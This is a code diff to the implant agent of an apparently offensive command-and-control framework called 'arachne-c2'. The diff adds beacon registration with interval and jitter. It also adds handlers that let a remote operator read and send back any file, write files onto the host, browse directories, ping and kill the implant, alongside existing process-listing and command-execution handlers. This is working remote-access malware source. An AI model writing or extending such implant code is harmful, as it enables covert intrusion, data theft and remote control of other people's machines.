@@ -17,9 +17,9 @@ import (
 	"github.com/multiformats/go-multiaddr"
 	"google.golang.org/protobuf/proto"
 
-	arachnepb "github.com/portbuster1337/arachne-c2/protobuf/arachnepb"
 	"github.com/portbuster1337/arachne-c2/pkg/cryptography"
 	"github.com/portbuster1337/arachne-c2/pkg/transport"
+	arachnepb "github.com/portbuster1337/arachne-c2/protobuf/arachnepb"
 )
 
 type Agent struct {
@@ -232,13 +232,19 @@ func (a *Agent) sendBeaconRegister() {
 		ActiveC2: a.node.ID().String(),
 	}
 
-	data, err := proto.Marshal(reg)
+	beaconReg := &arachnepb.BeaconRegister{
+		ID:       a.node.ID().String(),
+		Interval: int64(a.config.BeaconInterval.Seconds()),
+		Jitter:   int64(a.config.BeaconJitter.Seconds()),
+		Register: reg,
+	}
+	beaconData, err := proto.Marshal(beaconReg)
 	if err != nil {
-		log.Printf("[implant] marshal register: %v", err)
+		log.Printf("[implant] marshal beacon register: %v", err)
 		return
 	}
 
-	env := a.messenger.CreateEnvelope(0, data)
+	env := a.messenger.CreateEnvelope(transport.MsgTypeRegister, beaconData)
 	topic := a.messenger.BeaconTopic()
 	if err := a.messenger.SignAndSend(a.ctx, topic, env); err != nil {
 		log.Printf("[implant] send register: %v", err)
@@ -255,12 +261,26 @@ func (a *Agent) handleCommand(ctx context.Context, env *arachnepb.Envelope, send
 	log.Printf("[implant] received command type=%d", env.Type)
 
 	switch env.Type {
-	case 1:
+	case transport.MsgTypePs:
 		a.handlePs(env)
-	case 2:
+	case transport.MsgTypePing:
+		a.handlePing(env)
+	case transport.MsgTypeDownload:
+		a.handleDownload(env)
+	case transport.MsgTypeUpload:
+		a.handleUpload(env)
+	case transport.MsgTypeScreenshot:
+		a.handleScreenshot(env)
+	case transport.MsgTypeLs:
 		a.handleLs(env)
-	case 3:
+	case transport.MsgTypeCd:
+		a.handleCd(env)
+	case transport.MsgTypePwd:
+		a.handlePwd(env)
+	case transport.MsgTypeExecute:
 		a.handleExecute(env)
+	case transport.MsgTypeKill:
+		a.handleKill(env)
 	default:
 		log.Printf("[implant] unknown cmd type=%d", env.Type)
 	}
@@ -279,7 +299,96 @@ func (a *Agent) handlePs(env *arachnepb.Envelope) {
 	result.Processes = listProcesses()
 	data, _ := proto.Marshal(result)
 	log.Printf("[implant] ps result: %d processes", len(result.Processes))
-	a.sendResult(1, data)
+	a.sendResult(transport.MsgTypePs, data)
+}
+
+func (a *Agent) handlePing(env *arachnepb.Envelope) {
+	log.Printf("[implant] ping received")
+	a.sendResult(transport.MsgTypePing, nil)
+}
+
+func (a *Agent) handleDownload(env *arachnepb.Envelope) {
+	req := &arachnepb.DownloadReq{}
+	if err := proto.Unmarshal(env.Data, req); err != nil {
+		return
+	}
+
+	result := &arachnepb.Download{Path: req.Path}
+	data, err := os.ReadFile(req.Path)
+	if err != nil {
+		result.Exists = false
+	} else {
+		result.Exists = true
+		result.Data = data
+	}
+
+	respData, _ := proto.Marshal(result)
+	log.Printf("[implant] download %s: %d bytes", req.Path, len(data))
+	a.sendResult(transport.MsgTypeDownload, respData)
+}
+
+func (a *Agent) handleUpload(env *arachnepb.Envelope) {
+	req := &arachnepb.UploadReq{}
+	if err := proto.Unmarshal(env.Data, req); err != nil {
+		return
+	}
+
+	result := &arachnepb.Upload{Path: req.Path}
+	perm := os.FileMode(0644)
+	if req.Overwrite {
+		if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
+			return
+		}
+	} else {
+		if _, err := os.Stat(req.Path); err == nil {
+			return
+		}
+		if err := os.WriteFile(req.Path, req.Data, perm); err != nil {
+			return
+		}
+	}
+	result.BytesWritten = int32(len(req.Data))
+
+	respData, _ := proto.Marshal(result)
+	log.Printf("[implant] upload %s: %d bytes", req.Path, len(req.Data))
+	a.sendResult(transport.MsgTypeUpload, respData)
+}
+
+func (a *Agent) handleScreenshot(env *arachnepb.Envelope) {
+	log.Printf("[implant] screenshot requested (not implemented on this platform)")
+	a.sendResult(transport.MsgTypeScreenshot, nil)
+}
+
+func (a *Agent) handleCd(env *arachnepb.Envelope) {
+	req := &arachnepb.CdReq{}
+	if err := proto.Unmarshal(env.Data, req); err != nil {
+		return
+	}
+
+	result := &arachnepb.Pwd{}
+	if err := os.Chdir(req.Path); err != nil {
+		result.Path, _ = os.Getwd()
+	} else {
+		result.Path, _ = os.Getwd()
+	}
+
+	data, _ := proto.Marshal(result)
+	log.Printf("[implant] cd %s -> %s", req.Path, result.Path)
+	a.sendResult(transport.MsgTypePwd, data)
+}
+
+func (a *Agent) handlePwd(env *arachnepb.Envelope) {
+	result := &arachnepb.Pwd{}
+	result.Path, _ = os.Getwd()
+
+	data, _ := proto.Marshal(result)
+	log.Printf("[implant] pwd: %s", result.Path)
+	a.sendResult(transport.MsgTypePwd, data)
+}
+
+func (a *Agent) handleKill(env *arachnepb.Envelope) {
+	log.Printf("[implant] kill received, shutting down")
+	os.Exit(0)
 }
 
 func (a *Agent) handleLs(env *arachnepb.Envelope) {
@@ -311,7 +420,7 @@ func (a *Agent) handleLs(env *arachnepb.Envelope) {
 
 	data, _ := proto.Marshal(result)
 	log.Printf("[implant] ls %s: %d entries", req.Path, len(result.Files))
-	a.sendResult(2, data)
+	a.sendResult(transport.MsgTypeLs, data)
 }
 
 func (a *Agent) handleExecute(env *arachnepb.Envelope) {
@@ -341,7 +450,7 @@ func (a *Agent) handleExecute(env *arachnepb.Envelope) {
 
 	data, _ := proto.Marshal(result)
 	log.Printf("[implant] execute %s: exit=%d stdout=%d", req.Path, result.Status, len(result.Stdout))
-	a.sendResult(3, data)
+	a.sendResult(transport.MsgTypeExecute, data)
 }
 
 func (a *Agent) Close() error {
